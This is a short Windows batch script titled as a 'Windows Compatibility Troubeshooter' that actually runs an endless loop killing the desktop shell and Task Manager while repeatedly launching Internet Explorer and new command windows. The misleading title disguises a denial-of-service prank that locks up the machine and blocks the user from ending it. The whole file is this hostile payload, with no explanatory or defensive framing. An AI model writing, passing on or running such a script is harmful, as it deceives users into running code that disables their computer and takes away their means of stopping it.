@echo off
title Windows Compatibility Troubeshooter
:youalreadyknow
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
start iexplore
start
goto youalreadyknow
